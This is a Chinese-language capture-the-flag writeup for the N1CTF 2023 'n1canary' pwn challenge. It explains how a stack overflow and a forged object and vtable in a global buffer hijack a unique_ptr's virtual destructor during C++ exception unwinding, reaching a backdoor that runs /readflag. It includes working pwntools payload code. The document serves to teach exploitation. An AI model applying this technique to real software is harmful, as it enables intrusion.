# N1CTF 2023 n1canary Writeup

## 题目简述

程序让用户先提交 64 字节 `user_canary`，再用随机的 `sys_canary` 与之异或，为栈上每个 `ProtectedBuffer` 选择一个地址相关的 canary：

```cpp
u64 idx = ((u64)this >> 4) & 7;
return user_canary[idx] ^ sys_canary[idx];
```

`BOFApp::launch()` 中的 `scanf("%[^\n]", p)` 没有限长，能够覆盖栈；但随机 canary 无法泄漏。校验失败时，程序不是 `abort`，而是抛出 C++ 异常。`main` 又用 `std::unique_ptr<BOFApp>` 管理带虚析构函数的对象，这使异常展开期间的自动析构成为真正的控制流劫持点。

## 解题过程

### 在可控全局区伪造对象和虚表

第一次输入会原样写入全局数组 `user_canary`。将其同时当作伪造对象与伪造虚表：

```python
fake = flat(
    user_canary_addr + 8,  # fake BOFApp 的 vptr
    0,                     # 伪虚表首项
    backdoor_addr,         # 析构调用所取的虚函数槽
).ljust(64, b'\x00')
```

这样，地址 `user_canary_addr` 处的伪对象把 vptr 指向 `user_canary_addr+8`，而相应虚函数槽中放置程序自带的 `backdoor()`。后门直接执行 `/readflag`，不需要 libc 泄漏或 ROP。

### 主动触发异常并劫持清理过程

第二次输入故意覆盖 `ProtectedBuffer` 的 canary，使 `check()` 调用 `raise()` 抛出 `std::runtime_error`。C++ 异常处理器会根据返回地址和 LSDA 元数据寻找 `main` 中的 landing pad，并在进入 `catch` 前销毁已经构造的 `unique_ptr`。

溢出还可以覆盖编译器在栈上保存的 `unique_ptr<BOFApp>` 对象指针。关键是不能随意破坏用于查找异常处理范围的调用点地址；附件二进制中应保留 `0x403407`，再把其后的对象指针改为伪对象地址：

```python
payload  = b'a' * 0x68
payload += p64(0x403407)
payload += p64(user_canary_addr)
payload += b'\n'
```

异常展开执行 `std::unique_ptr<BOFApp>::~unique_ptr()`，其默认删除器对覆盖后的指针进行虚析构调用。两次解引用的效果为：先从 `user_canary_addr` 取出伪 vptr，再从虚表槽取出 `backdoor`，最终执行 `/readflag`。

完整利用的两次输入为：

```python
io.sendafter(b'To increase entropy, give me your canary\n', fake)
io.sendafter(b'input something to pwn :)\n', payload)
io.interactive()
```

## 方法总结

题目表面强调自定义 canary，但随机值本身既不需要恢复，也不需要伪造。栈破坏检测抛出可捕获异常，反而保证程序进入 C++ 清理路径；攻击者只需保留异常展开所依赖的调用点地址，并覆盖待析构的 `unique_ptr` 指针。可控全局数组同时承担伪对象和伪虚表存储，虚析构最终转入后门。分析 C++ Pwn 时，异常 landing pad、RAII 对象析构和删除析构函数的虚表槽都应视为可利用控制流，而不只是正常错误处理。
